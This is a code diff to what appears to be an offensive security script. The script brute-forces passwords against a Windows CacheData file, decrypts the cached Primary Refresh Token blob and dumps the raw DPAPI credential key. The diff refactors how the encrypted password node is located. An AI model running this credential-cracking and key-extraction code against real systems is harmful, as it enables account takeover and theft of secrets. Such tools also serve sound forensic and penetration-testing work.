@@ -4,32 +4,24 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
-from .dpapi_cred_key import DPAPICredKeyBlob
+from typing import List
+from scripts.parse_cachedata import CacheDataNode, parse_cache_data
+from scripts.dpapi_cred_key import DPAPICredKeyBlob
 import struct
 import hexdump
 
 def bruteforce(arguments):
     file_path = arguments.CacheData
-    with open(file_path, 'rb') as file:
-        Data = bytearray(file.read())
-    p = 0x60
-    enc_data_size = int.from_bytes(Data[p:p + 4], byteorder='little')
-    p += 4
-    if arguments.verbose:
-        print(f"Encrypted data size: {enc_data_size}.")
-    while True:
-        enc_key_size = int.from_bytes(Data[p:p + 4], byteorder='little')
-        p += 4
-        if arguments.verbose:
-            print("enc_key_size", enc_key_size)
-            print("p", p)
-        if enc_key_size == 0x30:
-             if int.from_bytes(Data[p + 0x30:p + 0x34], byteorder='little') == enc_data_size:
-                i = p + enc_data_size
-                if arguments.verbose:
-                    print(i)
-                break
-    enc_data = Data[p + 4 + 0x30:p + 4 + 0x30 + enc_data_size]
+    cache_data_node_list : List[CacheDataNode] = parse_cache_data(file_path)
+    cache_data_node_password = None
+    for entry in cache_data_node_list:
+        if entry.is_node_type_password():
+            cache_data_node_password = entry
+            break
+    if cache_data_node_password is None:
+        raise Exception('No node of type password (0x1) found in CacheData file')
+
+    enc_data = cache_data_node_password.encryptedPRTBlob
     for password in arguments.passwords:
         if arguments.verbose:
             print("Trying: " + password + "\n")
@@ -44,7 +36,7 @@ def bruteforce(arguments):
             decrypted_prt = decrypted_blob[0x70:]
             if not decrypted_prt.startswith(b'{"Version"'):
                 continue
-            print(f"\n[+] Password: '{password}'")
+            print(f"[+] Password: '{password}'")
             dpapi_cred_key_blob = decrypted_blob[0x10:0x10+raw_dpapi_cred_key_size]
             dpapi_cred_key_blob_obj = DPAPICredKeyBlob(dpapi_cred_key_blob)
             print(f'[+] Dumping raw DPAPI Cred key, with GUID {dpapi_cred_key_blob_obj.Guid} (0x40 bytes):')
